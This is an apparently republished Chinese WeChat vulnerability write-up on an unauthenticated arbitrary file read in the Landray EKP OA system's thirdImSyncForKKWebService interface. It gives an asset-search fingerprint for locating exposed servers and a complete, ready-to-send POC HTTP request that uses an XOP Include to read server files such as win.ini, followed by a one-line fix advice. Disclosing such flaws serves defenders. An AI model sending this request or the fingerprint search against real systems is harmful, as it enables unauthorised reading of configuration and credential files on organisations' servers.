---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  蓝凌EKP系统接口thirdImSyncForKKWebService接口存在任意文件读取漏洞  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-24 15:59  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
01  
  
—  
  
漏洞名称  
  
蓝凌  
EKP  
系统接口  
thirdImSyncForKKWebService  
接口存在任意文件读取漏洞  
  
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODqibicyU9t37wiaOrkjrX6g13ic7ibhIWgdkVpWpSEsVN1aXofQtGeA71OVOw/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
  
蓝凌  
EKP  
由深圳市蓝凌软件股份有限公司自主研发，是一款全程在线数字化  
OA  
，应用于大中型企业在线化办公，包含流程管理、知识管理、会议管理、公文管理、任务管理及督办管理等  
100  
个功能模块。蓝凌  
EKP  
系统接口  
thirdImSyncForKKWebService  
接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
  
  
  
04  
  
—  
  
资产测绘  
```
web.icon=="302464c3f6207d57240649926cfc7bd4"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODqjy4E1FiaBticq2ucf4S8uK6p2W3e0FwhqYSw9QTUN7yLmXEpcQzT1ZtA/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```
POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
Host: 域名:端口
Cookie:
acw_tc=0bce952217351164448538504e88d6f6fe2d8bc467a2114facce59d83f7060;
SESSION=OWIwMjEzMGItYWE2ZC00Nzg1LTk4ODItNTkyOWZjODBmYTdm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0;
Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62
Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua:
"Not;A=Brand";v="99",
"Chromium";v="106"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/related;
boundary=----oxmmdmlnvlx08yluof5q
Content-Length: 609
 
------oxmmdmlnvlx08yluof5q
                          Content-Disposition:
form-data; name="a"
 
                          <soapenv:Envelope
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
                          <soapenv:Header/>
                          <soapenv:Body>
                          <web:getTodo>
                          <arg0>
                          <otherCond>1</otherCond>
                          <pageNo>1</pageNo>
                          <rowSize>1</rowSize>
                          <targets>1</targets>
                          <type><xop:Include
xmlns:xop="http://www.w3.org/2004/08/xop/include"
href="file:///c:windows/win.ini"/></type>
                          </arg0>
                          </web:getTodo>
                          </soapenv:Body>
                          </soapenv:Envelope>
                          ------oxmmdmlnvlx08yluof5q--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODqqiaG2tx55EJ6waO34znswFhPC84JKibxHNyEgtdPQOmVn4AUjPTIJaHw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODq06qRsGPu3SoYnBM9JcmKqvUcHicKrWkr6CauoZlbkPHCUJcMFbHxiaxw/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
**升级到安全版本**  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
